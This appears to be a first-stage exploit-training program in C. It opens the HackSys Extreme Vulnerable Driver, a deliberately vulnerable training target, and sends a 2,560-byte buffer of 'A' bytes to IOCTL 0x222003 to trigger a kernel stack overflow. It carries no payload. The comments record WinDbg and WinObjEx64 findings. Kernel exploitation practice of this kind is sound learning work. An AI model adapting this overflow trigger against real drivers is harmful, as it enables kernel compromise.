#include <windows.h>
#include <winioctl.h>
#include <stdio.h>


/*

in windbg:

0: kd> !ioctldecode 0x222003

Unknown IOCTL  : 0x222003

Device Type    : 0x22 (FILE_DEVICE_WINLOAD) (FILE_DEVICE_USER_MODE_BUS) (FILE_DEVICE_USB) (FILE_DEVICE_UNKNOWN)
Method         : 0x3 METHOD_NEITHER
Access         : FILE_ANY_ACCESS
Function       : 0x800

*/

/*

from WinObjEx64:

\Device\HackSysExtremeVulnerableDriver

*/

const wchar_t* wszDevice = L"\\\\.\\HackSysExtremeVulnerableDriver";

BOOL Stage1(const wchar_t* wszPath)
{
    HANDLE hDevice = INVALID_HANDLE_VALUE;  // handle to the drive to be examined 
    BOOL bResult = FALSE;                 // results flag
    DWORD junk = 0;                     // discard results

    // char buf[2048];
    char buf[2560];
    memset(buf, 0x41, sizeof(buf));

    hDevice = CreateFileW(
        wszPath,                        // drive to open
        GENERIC_READ | GENERIC_WRITE,   // no access to the drive
        0,
        NULL,                           // default security attributes
        OPEN_EXISTING,                  // disposition
        0,                              // file attributes
        NULL);                          // do not copy file attributes

    wprintf(L"Device value: %p\n", hDevice);

    if (hDevice == INVALID_HANDLE_VALUE)    // cannot open the drive
    {
        wprintf(L"bad hDevice!\n");
        return (FALSE);
    }


    wprintf(L"Sending to the device!\n");

    bResult = DeviceIoControl(
        hDevice,                        // device to be queried
        0x222003,                       // operation to perform
        buf,                            // input buffer
        sizeof(buf),                    // input buffer size
        NULL,                           // output buffer
        0,                              // output buffer size
        &junk,                          // # bytes returned
        NULL);                          // synchronous I/O

    wprintf(L"DeviceIoControl: ok=%d err=%lu\n", bResult, GetLastError());

    CloseHandle(hDevice);

    return (bResult);
}



int wmain(int argc, wchar_t* argv[])
{
    BOOL bResult = FALSE;      // generic results flag

    bResult = Stage1(wszDevice);

    // bResult = TRUE;

    if (bResult)
    {
        wprintf(L"result should be ok!\n");
    }
    else
    {
        wprintf(L"Something failed. Error %ld.\n", GetLastError());
    }

    return ((int)bResult);
}
